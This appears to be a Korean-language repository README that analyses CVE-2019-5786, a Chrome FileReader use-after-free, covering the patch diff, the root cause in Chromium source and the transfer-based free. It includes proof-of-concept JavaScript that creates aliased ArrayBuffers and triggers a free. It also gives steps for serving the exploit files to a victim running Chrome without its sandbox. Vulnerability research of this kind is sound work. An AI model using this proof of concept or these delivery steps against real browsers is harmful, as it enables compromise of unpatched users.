# Chrome FileReader Use-After-Free Vulnerability

CVE-2019-5786 Chrome 72.0.3626.119 stable FileReader UaF exploit for Windows 7 x86. 


* python의 `SimpleHTTPServer`와 같은 모듈을 활용하여 웹 서버를 연 뒤, `iframe.html`과 `exploit.html`, `exploit.js` `wokrer.js`을 웹서버 동일 디렉토리 배치시킨다.
* `exploit.js`가 원활히 동작하기 위해선 Chrome.exe를 `--no-sandbox` 인자를 commandline에 포함한 상태로 실행시켜야 한다
* 이후 victim이 Chrome을 통해 `iframe.html`을 방문하게 되면 exploit이 수행된다.



## Overview

본 취약점이 패치된 버전인 72.0.3626.119..72.0.3626.121의 Chromium log를 통해 다음과 같은 내용을 확인할 수 있다.

> Merge M72: FileReader: Make a copy of the ArrayBuffer when returning partial results. 
> This is to avoid accidentally ending up with multiple references to the
same underlying ArrayBuffer. The extra performance overhead of this is
minimal as usage of partial results is very rare anyway (as can be seen
on https://www.chromestatus.com/metrics/feature/timeline/popularity/2158).


from : https://chromium.googlesource.com/chromium/src/+log/72.0.3626.119..72.0.3626.121?pretty=fuller


본 log가 의미하는 바는 해당 취약점으로 인해 `FileReader`가 partial result를 반환하는 과정에서 `ArrayBuffer`에 대한 여러 개의 참조(multiple reference)가 생성되는 경우가 존재하고, 이를 막기 위해 `ArrayBuffer`의 복사본을 partial result로서 반환한다(Make a copy of the ArrayBuffer)는 것이다.

따라서, 본 취약점은 partial result를 반환하는 과정에서 발생하는 취약점이라는 것을 패치 로그를 통해 추측할 수 있다.
  

  
## Root Cause Analysis  

자세한 정보는 [1], [8]을 참고하였다.

`FileReader` 오브젝트가 수행하는 역할은 다음과 같이 정의되어 있다.

> The FileReader object lets web applications asynchronously read the contents of files (or raw data buffers) stored on the user's computer, using File or Blob objects to specify the file or data to read.

여기서 핵심적인 단어는 **asynchronous**이다. `FileReader` 오브젝트는 파일을 읽어 로드하는 순간에도 그 데이터에 접근할 수 있고, 이는 주기적으로 등록된 callback 함수를 호출하는 것으로 구현되어 있다. 예를 들어,

```JS
var reader = new FileReader();
...
reader.addEventListener("progress", onProgress);
reader.addEventListener("loadend", x => console.log("Loading over"));
...

reader.readAsArrayBuffer(file);

```
위 코드에서 `file`이 로드되는 동안 지속적으로 ```"progress"```에 등록된 ```onProgress``` 콜백함수가 실행되며, 파일 데이터의 로드가 완료되면 ```"loadend"```에 등록된 ```x => console.log("Loading over")```가 실행되는 식이다.



### Patch Analysis

Google은 Chrome에 대한 소스를 제공하고 있으며, 문제가 발생하는 소스코드는 `file_reader_loader.cc`이다. Google이 제공하는 취약한 버전과 패치된 버전의 URL은 다음과 같다.

- Old one : https://github.com/chromium/chromium/blob/17cc212565230c962c1f5d036bab27fe800909f9/third_party/blink/renderer/core/fileapi/file_reader_loader.cc

- New one : https://github.com/chromium/chromium/blob/75ab588a6055a19d23564ef27532349797ad454d/third_party/blink/renderer/core/fileapi/file_reader_loader.cc


패치된 함수는 `FileReaderLoader::ArrayBufferResult` 함수로서 패치 전/후의 모습은 다음과 같다.

- Old `FileReaderLoader::ArrayBufferResult`

```C++
DOMArrayBuffer* FileReaderLoader::ArrayBufferResult() {
  DCHECK_EQ(read_type_, kReadAsArrayBuffer);
  if (array_buffer_result_)
    return array_buffer_result_;

  // If the loading is not started or an error occurs, return an empty result.
  if (!raw_data_ || error_code_ != FileErrorCode::kOK)
    return nullptr;

  DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_->ToArrayBuffer());
  if (finished_loading_) {
    array_buffer_result_ = result;
    AdjustReportedMemoryUsageToV8(
        -1 * static_cast<int64_t>(raw_data_->ByteLength()));
    raw_data_.reset();
  }
  return result;
}
```

- New `FileReaderLoader::ArrayBufferResult`

```C++
DOMArrayBuffer* FileReaderLoader::ArrayBufferResult() {
  DCHECK_EQ(read_type_, kReadAsArrayBuffer);
  if (array_buffer_result_)
    return array_buffer_result_;

  // If the loading is not started or an error occurs, return an empty result.
  if (!raw_data_ || error_code_ != FileErrorCode::kOK)
    return nullptr;

  if (!finished_loading_) {
    return DOMArrayBuffer::Create(
        ArrayBuffer::Create(raw_data_->Data(), raw_data_->ByteLength()));
  }

  array_buffer_result_ = DOMArrayBuffer::Create(raw_data_->ToArrayBuffer());
  AdjustReportedMemoryUsageToV8(-1 *
                                static_cast<int64_t>(raw_data_->ByteLength()));
  raw_data_.reset();
  return array_buffer_result_;
}
```

두 경우 중 패치된 `ArrayBufferResult`의 행위는, 다음과 같이 크게 3가지 경우로 나뉜다.

1. result 값이 캐시된 상태라면, 이를 반환한다.
2. result 값이 캐시되지 않았고, 데이터가 로딩을 끝낸 상태라면(finished loading), `DOMArrayBuffer`를 생성하고(`Create`) 이를 반환한다.
3. result 값이 캐시되지 않았고, 데이터가 로딩을 끝내지 못한 상태라면, 임시 `DOMArrayBuffer`를 생성하고, 이를 반환한다.

패치되지 않은 경우와의 주요 차이점은 3번 항목, 즉, **`finished_loading`이 설정되지 않은 경우**에서 발생하는데, 해당 조건에서 실행되는 코드를 비교하면 구체적인 root cause를 분석할 수 있으며, 두 버전은 아래와 같이 `DOMArrayBuffer::Create` 함수에 서로 다른 인자를 전달한다.

##### Old
```C++
    DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_->ToArrayBuffer());
```
##### New
```C++
    DOMArrayBuffer::Create(ArrayBuffer::Create(raw_data_->Data(), raw_data_->ByteLength()));
```

패치 전의 코드는 `ArrayBufferBuilder::ToArrayBuffer()`를 인자로 사용하고 있으며, 패치 후의 경우,  `ArrayBuffer::Create` 함수가 그 역할을 대신한다. 두 경우 모두 `scoped_refptr<ArrayBuffer>` 형태의 값을 반환한다.

먼저 패치된 버전을 살펴보면 `ArrayBuffer::Create` 함수는 2개의 인자를 사용하는데 (1) `Data` (2) `ByteLength`로 구성된다.
`ArrayBuffer::Create(const void*, size_t)` 함수의 원형은 다음과 같다.

##### `ArrayBuffer::Create(const void*, size_t)`
```C++
scoped_refptr<ArrayBuffer> ArrayBuffer::Create(const void* source,
                                               size_t byte_length) {
  ArrayBufferContents contents(byte_length, 1, ArrayBufferContents::kNotShared,
                               ArrayBufferContents::kDontInitialize);
  if (UNLIKELY(!contents.Data()))
    OOM_CRASH();
  scoped_refptr<ArrayBuffer> buffer = base::AdoptRef(new ArrayBuffer(contents));
  memcpy(buffer->Data(), source, byte_length);
  return buffer;
}
```

위 함수가 수행하는 것은

1. `ArrayBuffer` 생성
2. `scoped_refptr<ArrayBuffer>`에 1에서 생성된 `ArrayBuffer` 저장
3. `memcpy` 함수를 통해 `source`를 `byte_length`만큼 생성된 버퍼에 복사

의 3단계로 구성된다. (2)에서 사용되는 `scoped_refptr<>`은 Chrome이 reference count를 관리하는 자료형으로서, 특정 오브젝트를 참조하는 다른 오브젝트의 개수를 나타내기 위해 쓰인다.[2]


반대로 패치 전의 코드에서 사용하는 `ArrayBufferBuilder::ToArrayBuffer()` 함수를 살펴보면 다음과 같다.[3]

##### `ArrayBufferBuilder::ToArrayBuffer()`

```C++
scoped_refptr<ArrayBuffer> ArrayBufferBuilder::ToArrayBuffer() {
  // Fully used. Return m_buffer as-is.
  if (buffer_->ByteLength() == bytes_used_)
    return buffer_;

  return buffer_->Slice(0, bytes_used_);
}
```
`ToArrayBuffer` 함수는 크게 2가지의 경우로 나뉘는데, 하나는 위 구문의 

```C++
        if (buffer_->ByteLength() == bytes_used_)
            return buffer_
```
를 만족하는 경우로 `ArrayBufferBuilder`의 멤버 변수인 `buffer_` 값을 **아무런 조작없이 그대로 반환**한다(자세한 `buffer_`의 선언은 [4] 참조). 즉, Overview에서 설명했던 `FileReader` 오브젝트가 partial result를 반환할 때(`finished_loading_` 변수가 `false` 일 때), 하나의 `ArrayBuffer`에 대한 복수의 reference를 획득하게 된다는 것이 이 경우를 의미하는 것으로 생각할 수 있다.

위 조건을 만족하지 않는 경우, 현재 `ArrayBufferBuilder`의 `bytes_used_` 개수만큼의 데이터를 `ArrayBuffer::Slice(int begin, int end)` 함수를 통해 복사하게 된다. [5][6]


##### `ArrayBuffer::Slice(int begin, int end)`
```C++
scoped_refptr<ArrayBuffer> ArrayBuffer::Slice(int begin, int end) const {
  return SliceImpl(ClampIndex(begin), ClampIndex(end));
}

scoped_refptr<ArrayBuffer> ArrayBuffer::SliceImpl(unsigned begin,
                                                  unsigned end) const {
  size_t size = static_cast<size_t>(begin <= end ? end - begin : 0);
  return ArrayBuffer::Create(static_cast<const char*>(Data()) + begin, size);
}
```

`Slice` 함수는 `SliceImpl`를 호출하고, 이어서 `SliceImpl`는 `ArrayBuffer::Create`를 통해 **새로운 `ArrayBuffer`를 생성**한 뒤, 이를 반환한다.


즉, 취약한 버전과 패치된 버전의 주요 차이점은

- `finished_loading_`이 set되지 않은 상태에서(로드가 완료되지 않은 상태에서)
- `buffer_->ByteLength() == bytes_used_`를 만족하는 경우,
- `DOMArrayBuffer::Create`의 인자로 새로 생성되지 않은 기존의 `scoped_refptr<ArrayBuffer>`가 전달된다 (**동일한 `ArrayBuffer`를 참조하는 다수의 오브젝트의 획득**)

으로 정리할 수 있다. 




### Root Cause Analysis

#### POC

본 취약점의 Proof-of-Concept 코드는 아래와 같다.

```js
magic_string_size = 100*730000
magic_string = "A".repeat(magic_string_size)

file = new Blob([magic_string])
array_ref1 = null
array_ref2 = null

function onProgress(){

	console.log("progress")
	array_ref1 = reader.result
	if(array_ref1.byteLength == magic_string_size){ // CASE : buffer_->ByteLength() == bytes_used_
		if (array_ref2 != null) return;
		array_ref2 = reader.result
		if (array_ref1 != array_ref2){
			console.log(array_ref1)
			console.log(array_ref2)

			view1 = new Uint8Array(array_ref1)
			view2 = new Uint8Array(array_ref2)

			view1[0] = 66
			console.log(view1[0])
			console.log(view2[0])
			if(view2[0] == 66){
				console.log("Success");
			}
			else{
				console.log("Failed view test")
			}

		}
		else
		{ 
			console.log("Failed")
		}
	}
}

var reader = new FileReader();
reader.addEventListener("progress", onProgress);
reader.addEventListener("loadend", x => console.log("Loading over"));

function go(){
	reader.readAsArrayBuffer(file);
}

function on_decode_failed(){
	console.log("Ref2 size: " + array_ref2.byteLength)
	console.log("Ref1 size: " + array_ref1.byteLength)
}

function pwn(){
	c1 = new AudioContext();
	c1.decodeAudioData(array_ref2, x=> console.log("decode success"), on_decode_failed);
	c1 = null
}

function crash(){
	console.log(view1[0])
}

```

여기서, ```array_ref1```와 ```array_ref2```는 동일한 ArrayBuffer를 참조하는 서로 다른 ```DOMArrayBuffer```이다. 이는 ```view1[0] = 66``` 구문을 실행시켰을 때, ```view2[0]```의 값 또한 동일하게 변화하는 것을 통해 확인이 가능하다. 

만약 ```array_ref1```을 통해 ```ArrayBuffer```를 free시킬 수 있다면, ```array_ref2```의 ```ArrayBuffer```를 가리키는 포인터는 dangling pointer가 되기 때문에 Use-After-Free 버그가 발생한다.



### How to Trigger Free?


자바스크립트의 `postMessage` 함수는 transfer 인자가 존재한다. 이는 worker에 현재 thread가 가진 오브젝트를 효율적으로 전달하기 위해 지원되는 인자이다. 해당 기능의 특이한 점 중 하나는 전달된 오브젝트의 소유권(ownership)을 worker thread에 넘기고, 본 thread에서는 더 이상 해당 오브젝트를 사용할 수 없게 된다는 점이다.[10]

* 참고 : transferable 오브젝트를 전달하는 자바스크립트 API에는 POC 코드에서처럼 ```AudioContext::decodeAudioData``` 또한 존재하며, 이는 UAF에서 free를 유도하는 구문으로 활용될 수 있을 것으보 보인다.



##### SerializedScriptValue::ArrayBufferContentsArray [9]

```C++
SerializedScriptValue::ArrayBufferContentsArray
SerializedScriptValue::TransferArrayBufferContents(
    v8::Isolate* isolate,
    const ArrayBufferArray& array_buffers,
    ExceptionState& exception_state) {
  ArrayBufferContentsArray contents;

  if (!array_buffers.size())
    return ArrayBufferContentsArray();

  for (auto* it = array_buffers.begin(); it != array_buffers.end(); ++it) {
    DOMArrayBufferBase* array_buffer = *it;
    if (array_buffer->IsNeutered()) {
      wtf_size_t index =
          static_cast<wtf_size_t>(std::distance(array_buffers.begin(), it));
      exception_state.ThrowDOMException(DOMExceptionCode::kDataCloneError,
                                        "ArrayBuffer at index " +
                                            String::Number(index) +
                                            " is already neutered.");
      return ArrayBufferContentsArray();
    }
  }

  contents.Grow(array_buffers.size());
  HeapHashSet<Member<DOMArrayBufferBase>> visited;
  for (auto* it = array_buffers.begin(); it != array_buffers.end(); ++it) {
    DOMArrayBufferBase* array_buffer_base = *it;
    if (visited.Contains(array_buffer_base))
      continue;
    visited.insert(array_buffer_base);

    wtf_size_t index =
        static_cast<wtf_size_t>(std::distance(array_buffers.begin(), it));
    if (array_buffer_base->IsShared()) {
      exception_state.ThrowDOMException(DOMExceptionCode::kDataCloneError,
                                        "SharedArrayBuffer at index " +
                                            String::Number(index) +
                                            " is not transferable.");
      return ArrayBufferContentsArray();
    } else {
      DOMArrayBuffer* array_buffer =
          static_cast<DOMArrayBuffer*>(array_buffer_base);

      if (!array_buffer->Transfer(isolate, contents.at(index))) {
        exception_state.ThrowDOMException(DOMExceptionCode::kDataCloneError,
                                          "ArrayBuffer at index " +
                                              String::Number(index) +
                                              " could not be transferred.");
        return ArrayBufferContentsArray();
      }
    }
  }
  return contents;
}
```




```C++

bool DOMArrayBuffer::Transfer(v8::Isolate* isolate,
                              WTF::ArrayBufferContents& result) {
  DOMArrayBuffer* to_transfer = this;
  if (!IsNeuterable(isolate)) {
    to_transfer =
        DOMArrayBuffer::Create(Buffer()->Data(), Buffer()->ByteLength());
  }

  if (!to_transfer->Buffer()->Transfer(result))
    return false;

  Vector<v8::Local<v8::ArrayBuffer>, 4> buffer_handles;
  v8::HandleScope handle_scope(isolate);
  AccumulateArrayBuffersForAllWorlds(isolate, to_transfer, buffer_handles);

  for (const auto& buffer_handle : buffer_handles)
    buffer_handle->Neuter();

  return true;
}




```


---


## References

[1] https://securingtomorrow.mcafee.com/blogs/other-blogs/mcafee-labs/analysis-of-a-chrome-zero-day-cve-2019-5786/

[2] https://www.chromium.org/developers/smart-pointer-guidelines

[3] https://github.com/chromium/chromium/blob/17cc212565230c962c1f5d036bab27fe800909f9/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.cc#L103

[4] https://github.com/chromium/chromium/blob/17cc212565230c962c1f5d036bab27fe800909f9/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.h#L94

[5] https://github.com/chromium/chromium/blob/17cc212565230c962c1f5d036bab27fe800909f9/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer.h#L264

[6] https://github.com/chromium/chromium/blob/17cc212565230c962c1f5d036bab27fe800909f9/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer.h#L272

[7] https://github.com/chromium/chromium/blob/17cc212565230c962c1f5d036bab27fe800909f9/third_party/blink/renderer/core/typed_arrays/dom_array_buffer.h#L20


[8] https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/

[9] https://github.com/chromium/chromium/blob/17cc212565230c962c1f5d036bab27fe800909f9/third_party/blink/renderer/bindings/core/v8/serialization/serialized_script_value.cc#L683

[10] why-are-transfered-buffers-neutered-in-javascript : https://stackoverflow.com/questions/38169672/why-are-transfered-buffers-neutered-in-javascript



[11] DOMArrayBuffer::Transfer : https://github.com/chromium/chromium/blob/17cc212565230c962c1f5d036bab27fe800909f9/third_party/blink/renderer/core/typed_arrays/dom_array_buffer.cc#L40
